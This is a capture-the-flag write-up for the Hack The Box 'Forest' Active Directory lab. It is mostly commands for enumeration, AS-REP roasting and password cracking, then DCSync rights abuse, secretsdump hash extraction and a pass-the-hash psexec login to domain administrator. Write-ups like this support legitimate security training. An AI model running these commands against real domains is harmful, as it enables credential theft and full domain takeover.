**Ping**
![[Pasted image 20240703104501.png]]

**Nmap Scans**
```
mapit 10.10.10.161
```

Nmap Default Scan
![[Pasted image 20240703104614.png]]

Nmap Service and Script Scan
![[Pasted image 20240703104709.png]]
![[Pasted image 20240703104723.png]]

Nmap All Port Scan
![[Pasted image 20240703104750.png]]

Nmap Service and Script Scan for New ports found
![[Pasted image 20240703104836.png]]

Smb is not vulnerable, and after a lot of enumeration with smb and ldap services, I got Usernames and built in groups and AD environment info's using bot ldapsearch and enum4linux, below are the command I have used, I can't attach Screen shots, because the outputs are in enormous amount.
```
enum4linux -a 10.10.10.161
```
```
ldapsearch -v -x -b "DC=htb,DC=local" -H "ldap://10.10.10.161" "(objectclass=*)" > ldap.txt
```

Finally got some useful info while As-rep Roasting without username and password
```
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
```
![[Pasted image 20240703114849.png]]

Will Jump to Initial Foothold....!

Will crack the hash using John, I have saved the hash in a file named asrep.hash
```
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
```
![[Pasted image 20240703115021.png]]
So the creds is **svc-alfresco:s3rvice**

We can Now list Shares
```
crackmapexec smb 10.10.10.161 -u svc-alfresco -p "s3rvice" --shares
```
![[Pasted image 20240703115304.png]]

We can get session using winrm
```
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p "s3rvice"
```
![[Pasted image 20240703115358.png]]

Using Evil-Winrm
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p "s3rvice"
```
![[Pasted image 20240703115539.png]]

User.txt
![[Pasted image 20240703115814.png]]


Will Jump to Privilege Escalation....!


Will check our Privileges
```
whoami /priv
```
![[Pasted image 20240703120011.png]]
We can computers to domain

We can add up to 10 computers
```
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```
![[Pasted image 20240703120215.png]]

Will Add computer and Impersonate Administrator
```
impacket-addcomputer htb.local/svc-alfresco -dc-ip 10.10.10.161 -computer-name 'pwned$' -computer-pass 'pwned@3000'
```
![[Pasted image 20240703120625.png]]

But we can't set delegation rights to impersonate the Administrator, will find another way, will gather Ad info using Sharphound.

Firstly we are in the group Service Accounts
![[Pasted image 20240703122259.png]]

Run Sharp hound
```
Import-Module ./sharp.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop\ -OutputPrefix "forest"
```
![[Pasted image 20240703122714.png]]

Lets Transfer the .zip file to our kali and analyse using Bloodhound
![[Pasted image 20240703124419.png]]
As we are the member of Account operators, we can create users in domain and manage the group and its memberships.

Will create a user first
```
net user rosh pwn@3000 /add /domain
```
![[Pasted image 20240703124628.png]]

As we have generic all permission on the system 
![[Pasted image 20240703130436.png]]

![[Pasted image 20240703130630.png]]

So first we add user rosh to Exchange Windows Permissions group
```
net group "Exchange Windows Permissions" rosh /add /domain
```
![[Pasted image 20240703130923.png]]

Will give this group DCSync rights
```
$secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'rosh' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```
![[Pasted image 20240703131518.png]]

Will use Secretsdump to get NYLM hashes of users
```
impacket-secretsdump rosh:pwn@3000@10.10.10.161
```
![[Pasted image 20240703131558.png]]
Got Admin's NTLM

Will get a session using Pkexec
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```
![[Pasted image 20240703131907.png]]

**root.txt**
![[Pasted image 20240703132000.png]]





Done with Forest..........:)